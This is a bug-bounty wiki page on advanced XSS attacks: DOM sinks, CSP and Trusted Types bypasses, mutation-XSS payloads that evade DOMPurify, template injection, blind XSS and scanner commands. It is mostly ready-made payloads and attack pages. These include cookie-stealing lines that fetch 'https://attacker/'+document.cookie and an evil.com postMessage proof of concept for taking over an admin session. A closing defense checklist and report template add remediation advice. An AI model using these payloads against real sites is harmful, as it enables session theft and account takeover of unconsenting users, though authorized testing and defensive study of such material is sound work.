---
type: wiki
category: attack
tool: dalfox,xsstrike,manual
status: active
last-updated: 2026-04-21
---

# XSS Deep Attacks (2026 Edition)

> **Purpose:** In 2026, CSP / Trusted Types / SameSite have driven down reflected-XSS bounties, but DOM XSS / Mutation XSS / CSP bypass / Trusted Types bypass are still P2-P1. This document goes deeper than the payload cheatsheet.

## 0. Classification and 2026 payout tiers

| Type | 2026 bounty tier | Notes |
|------|------------------|------|
| Reflected (no CSP) | P3-P4 | Popular programs mostly mark as dupe |
| Reflected (CSP bypass) | P2-P3 | Only valuable if you demonstrate the CSP is bypassable |
| Stored XSS | P2 (regular user) / P1 (admin panel) | Must prove an admin will view it |
| DOM XSS | P2-P3 | Sink needs clear user interaction |
| Self-XSS (alone) | P5 / N/A | Only escalates when chained with login CSRF |
| Mutation XSS (mXSS) | P1-P2 | DOMPurify-bypass tier |
| Trusted Types bypass | P1 | Rare but high impact |

## 1. DOM XSS Sink Deep Dive

### 1.1 Sink list (grep targets)

```bash
grep -rE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|document\.writeln|\.html\(|\.append\(|\.prepend\(|\.after\(|\.before\(|eval\(|setTimeout\(|setInterval\(|Function\(|location(\.|\s*=)|window\.open|\.src\s*=|\.href\s*=|\.action\s*=|dangerouslySetInnerHTML' src/
```

### 1.2 Source -> Sink tracing

```
Sources: location.hash / location.search / document.referrer / postMessage /
        localStorage / sessionStorage / indexedDB / WebSQL / URL fragment

Sinks: innerHTML / eval / setTimeout / .src / .href / Function() / document.write
```

### 1.3 postMessage XSS

```html
<!-- evil.com -->
<iframe src="https://target.com/" id="f"></iframe>
<script>
document.getElementById('f').onload = () => {
  document.getElementById('f').contentWindow.postMessage(
    {type:'render', html:'<img src=x onerror=alert(origin)>'}, '*');
};
</script>
```

Detection:

```javascript
// Look for this in target.com's JS
window.addEventListener('message', (e) => {
  // If e.origin isn't validated -> any site can send messages
  document.body.innerHTML = e.data.html;   // sink
});
```

### 1.4 Classic location.hash sink

```javascript
// If the app writes this
$(location.hash.slice(1));   // jQuery < 3.5 -> treats #<img> as a selector+HTML

// PoC
https://target.com/page#<img src=x onerror=alert(1)>
```

### 1.5 history.pushState -> then navigate

Some SPAs use `location.pathname` or `history.state` to fill in the DOM:

```
https://target.com/app/"><svg onload=alert(1)>
```

## 2. CSP Bypass Techniques

### 2.1 Detecting CSP

```bash
curl -I https://target.com/ | grep -i 'content-security-policy'

# CSP Evaluator
# https://csp-evaluator.withgoogle.com/
# Paste the CSP to see where it's weak
```

### 2.2 Common weak CSPs

| Weakness | Bypass |
|------|------|
| `'unsafe-inline'` | Just write `<script>alert(1)</script>` |
| `'unsafe-eval'` | `eval()` / `Function()` / `setTimeout(str)` |
| `script-src *` | Any domain can be loaded |
| `script-src self` + JS upload allowed | Upload `.js` then `<script src="/uploads/x.js">` |
| `script-src self` + JSONP endpoint | `<script src="/api/jsonp?callback=alert(1)//"></script>` |
| Missing `base-uri` | `<base href="//evil/">` makes relative paths hit the attacker's server |
| Missing `object-src 'none'` | `<object data="javascript:alert(1)">` or `<embed>` |
| `script-src nonce-XYZ` gets reflected | Grab the nonce, then inject `<script nonce="XYZ">...</script>` |

### 2.3 JSONP bypassing CSP (classic)

```
# CSP: script-src 'self' *.google.com

# Inject
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
# callback gets executed as JS -> XSS
```

JSONP endpoint list: https://github.com/zigoo0/JSONBee

### 2.4 Angular sandbox escape

If the target uses old Angular with `script-src 'self' 'unsafe-eval'`:

```html
{{constructor.constructor('alert(1)')()}}
```

### 2.5 Nonce reuse / prediction

Some servers don't rotate the nonce per-request:

```bash
for i in {1..5}; do curl -sI https://target.com/ | grep -i nonce; done
# If the nonce stays the same -> it can be reused
```

### 2.6 Dangling markup (no script needed)

```html
<!-- Exfiltrate an attacker-controlled token without JS -->
<img src="https://evil.com/?token=
<!-- The rest of the HTML gets treated as part of the URL -> data exfiltration -->
```

Most 2026 browsers block this, but email clients / PDF generators often don't.

## 3. Mutation XSS (mXSS)

### 3.1 Principle

DOMPurify or a browser sanitizer parses HTML first -> the browser "mutates" certain tags into a different structure -> the sanitized HTML is re-serialized -> what was originally safe becomes unsafe.

### 3.2 Historical DOMPurify bypasses (for inspiration)

```html
<!-- CVE-2019-16728 and variants -->
<style><style/><img src=x onerror=alert(1)>

<!-- CVE-2020-26870 -->
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>

<!-- 2024 Masato Kinugawa paper variants -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Follow Masato Kinugawa / @SecurityMB on Twitter + the GitHub issue tracker for the latest bypasses.

### 3.3 Testing tools

```bash
# Throw suspicious mXSS payloads at the sanitizer under test
npm install -g dompurify
# Write a script that loops through a payload file

# Lab environment
git clone https://github.com/cure53/DOMPurify
cd DOMPurify/test
```

### 3.4 Common mXSS targets

- Rich-text editors (CKEditor / TinyMCE / Quill) import/paste
- Email clients (Gmail-style)
- Markdown renderers
- Client-side template engines (Mustache / Handlebars)

## 4. Trusted Types Bypass

### 4.1 Background

Chrome 83+ supports `Content-Security-Policy: require-trusted-types-for 'script'`. Only a policy-signed `TrustedHTML` can enter a sink.

### 4.2 Bypasses

| Bypass | Description |
|------|------|
| Lazy policy | The app calls `trustedTypes.createPolicy('default', {...})` but the transform function is lazy -> just returns the input as-is |
| DOM clobbering | `<a id=trustedTypes>` overwrites `window.trustedTypes` |
| `eval('...')` | Trusted Types blocks innerHTML but unsafe-eval is still on |
| Existing policy name | Find a bug in the source code's `createPolicy('foo', ...)` |

```javascript
// Original code
const p = trustedTypes.createPolicy('default', {
  createHTML: (s) => DOMPurify.sanitize(s)
});
// If DOMPurify has an mXSS bug -> Trusted Types won't save you
```

### 4.3 Post-message clobbering

```html
<iframe name="trustedTypes"></iframe>
<!-- window.trustedTypes gets clobbered -> undefined -> the fallback becomes bypassable -->
```

## 5. Client-Side Template Injection (CSTI)

### 5.1 AngularJS (1.x) old versions

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### 5.2 Vue.js

```
{{_c.constructor('alert(1)')()}}
{{_v.constructor('alert(1)')()}}
```

### 5.3 React (dangerouslySetInnerHTML)

```javascript
// React does not sanitize this prop
<div dangerouslySetInnerHTML={{__html: userInput}}/>
```

Direct XSS (React doesn't apply mutation protection to this).

## 6. Blind XSS

Stored, but doesn't trigger on your test page — it fires when an admin views a support ticket in the backend:

### 6.1 Set up a callback

```bash
# Use XSS Hunter or self-hosted
curl https://xsshunter.com/register
# Get your payload

# Or self-host interactsh
interactsh-client -v
```

### 6.2 Payload

```html
<script src="https://xss.ht/abc123"></script>
<!-- or -->
<img src=x onerror=fetch('https://attacker/'+document.cookie)>
```

Place it "where the admin will look":
- Support ticket body
- Log message / User-Agent
- Display name / nickname (shown in the backend)
- Referer / registration source
- File metadata (EXIF title / comments)

## 7. Tools

### 7.1 Dalfox (primary)

```bash
# Single URL
dalfox url 'https://target.com/?q=FUZZ' --cookie 'session=...'

# From a URL list (gau output)
cat urls.txt | dalfox pipe --blind https://xss.ht/abc

# DOM mining + param discovery
dalfox url https://target.com/ --mining-dom --mining-dict-word /path/to/params.txt
```

### 7.2 XSStrike

```bash
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python xsstrike.py -u "https://target.com/?q=1" --fuzzer
```

### 7.3 kxss (grep pattern sink)

```bash
echo https://target.com/ | hakrawler | kxss
# Find reflection points + auto-flag which characters go unescaped
```

### 7.4 DOM Invader (Burp Pro)

Enable it -> it automatically tracks source/sink, postMessage, and DOM clobbering.

### 7.5 CSP Evaluator

```
https://csp-evaluator.withgoogle.com/
```

### 7.6 JSONBee (JSONP endpoint database)

```
https://github.com/zigoo0/JSONBee
```

## 8. Full PoC: Stored DOM XSS via postMessage to the admin panel

### Step 1: Find the postMessage handler

```javascript
// target.com/admin.js
window.addEventListener('message', (e) => {
  document.getElementById('preview').innerHTML = e.data.html;
});
// No origin check
```

### Step 2: evil.com

```html
<iframe src="https://target.com/admin" id="f"></iframe>
<script>
setTimeout(() => {
  document.getElementById('f').contentWindow.postMessage({
    html: `<img src=x onerror="fetch('https://attacker/'+document.cookie)">`
  }, '*');
}, 2000);
</script>
```

### Step 3: Admin visits evil.com -> cookie exfiltrated -> ATO

### Step 4: Report

```markdown
## Vulnerability Summary
The message event handler in https://target.com/admin.js does not validate e.origin, allowing
an attacker to send a postMessage from evil.com that triggers an innerHTML injection and steals
the admin session cookie (HttpOnly doesn't help here since document.cookie isn't the read path —
instead, verify secrets from a fetch API response).

## Impact
- Admin session cookie exfiltration -> backend takeover
- Precondition: admin browses to an attacker-controlled link (common via phishing)

## Severity
P1 / Critical (admin takeover)

## Remediation
1. Validate e.origin === 'https://target.com'
2. Change the sink to textContent or DOMPurify.sanitize
3. Enable Trusted Types
```

## 9. Defense checklist

```
1. Always apply context-aware output escaping (HTML / JS / URL / CSS)
2. Disable innerHTML / document.write, use textContent / createElement instead
3. CSP: default-src 'self'; script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'self';
4. Use DOMPurify or an equivalent sanitizer, kept up to date
5. Define Trusted Types policies strictly, don't be lazy with the default policy
6. postMessage handlers must always validate origin
7. Upgrade jQuery to 3.5+ (fixes the hash XSS)
8. Framework guidance: React should avoid dangerouslySetInnerHTML, Angular should use DomSanitizer, Vue should avoid v-html
9. Email / PDF output should go through a separate renderer + sanitizer
```

## Related documents

- [18-payload-cheatsheet.md](18-payload-cheatsheet.md) — XSS polyglots
- [25-tool-dalfox.md](25-tool-dalfox.md) — Full Dalfox usage
- [63-prototype-pollution.md](63-prototype-pollution.md) — PP combined with an XSS gadget
- [64-cache-poisoning.md](64-cache-poisoning.md) — reflected -> stored via cache
- PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
- CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Masato Kinugawa mXSS: https://research.securitum.com/mutation-xss-via-namespace-confusion-dompurify-2-0-17-bypass/
